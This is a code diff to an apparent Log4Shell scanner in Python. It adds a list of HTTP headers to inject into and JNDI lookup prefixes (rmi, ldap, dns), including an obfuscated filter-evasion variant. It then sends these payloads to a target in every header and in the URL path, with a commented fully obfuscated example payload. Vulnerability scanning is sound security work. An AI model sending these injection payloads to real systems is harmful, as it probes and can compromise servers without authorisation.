@@ -15,6 +15,26 @@ from urllib.parse import urlparse
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO)
 
+header_injects = [
+    'X-Api-Version',
+    'User-Agent',
+    'Referer',
+    'X-Druid-Comment',
+    'Origin',
+    'Location',
+    'X-Forwarded-For',
+    'Cookie',
+    'X-Requested-With',
+    'X-Forwarded-Host',
+    'Accept'
+]
+
+prefixes_injects = [
+    'jndi:rmi',
+    'jndi:ldap',
+    'jndi:dns',
+    'jndi:${lower:l}${lower:d}ap'
+]
 
 def argparsing(exec_file):
     parser = argparse.ArgumentParser(exec_file)
@@ -41,42 +61,55 @@ def argparsing(exec_file):
 
     return parser
 
-def check1(schema, url_input, reply_host, header_name, payl, timeout):
-    logging.info(f"check1: Sending request to {schema}{url_input.hostname} using {header_name} injecting {payl}")
 
-    # Check 1 (User Agent)
+
+def send_request(url, headers={}, timeout=5):
     try:
         requests.get(
-            f"{schema}{url_input.hostname}",
-            headers={header_name: payl},
+            url,
+            headers=headers,
             verify=False,
             timeout=timeout
         )
     except requests.exceptions.ConnectionError as e:
-        logging.error(f"HTTP connection to {schema}{url_input.hostname} URL error: {e}")
+        logging.error(f"HTTP connection to target URL error: {e}")
+    except requests.exceptions.Timeout:
+        logging.error("HTTP request timeout")
+    except (requests.exceptions.InvalidURL, urllib3.exceptions.LocationParseError) as e:
+        logging.error(f"Failed to parse URL: {e}")
 
+def generate_header_value(payl):
+    headers = {}
+
+    for header in header_injects:
+        headers[header] = payl
+
+    return headers
+
+
+# Check 1 (User Agent)
+def check1(schema, url_input, reply_host, payl, timeout):
+    logging.info(f"check1: Sending request to {schema}{url_input.hostname} using injecting {payl}")
+
+    headers = generate_header_value(payl)
+    send_request(f"{schema}{url_input.netloc}", headers, timeout)
+
+
+# Check 2 (Get request)
 def check2(schema, url_input, reply_host, payl, timeout):
     logging.info(f"check2: Sending request to {schema}{url_input.hostname} injecting {payl}")
 
-    # Check 2 (Get request)
-    try:
-        requests.get(
-            f"{schema}{url_input.hostname}/{payl}",
-            verify=False,
-            timeout=timeout
-        )
-    except requests.exceptions.ConnectionError as e:
-        logging.error(f"HTTP connection to {schema}{url_input.hostname} URL error: {e}")
+    send_request(f"{schema}{url_input.netloc}/{payl}", {}, timeout)
 
 
-def deliver(args, url_input, reply_host, header_name, payl, timeout):
+def deliver(args, url_input, reply_host, payl, timeout):
     schema = ['http://', 'https://']
 
     for s in schema:
         if args.httpsonly and s != 'https://':
             continue
 
-        check1(s, url_input, reply_host, header_name, payl, timeout)
+        check1(s, url_input, reply_host, payl, timeout)
         check2(s, url_input, reply_host, payl, timeout)
 
 
@@ -110,10 +143,8 @@ def payload_generation(args, url_input, reply_host, timeout):
 #${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
 
 
-    header_name = 'User-Agent'
-
     for payl in payloads:
-        deliver(args, url_input, reply_host, header_name, payl, timeout)
+        deliver(args, url_input, reply_host, payl, timeout)
 
 
 def main():
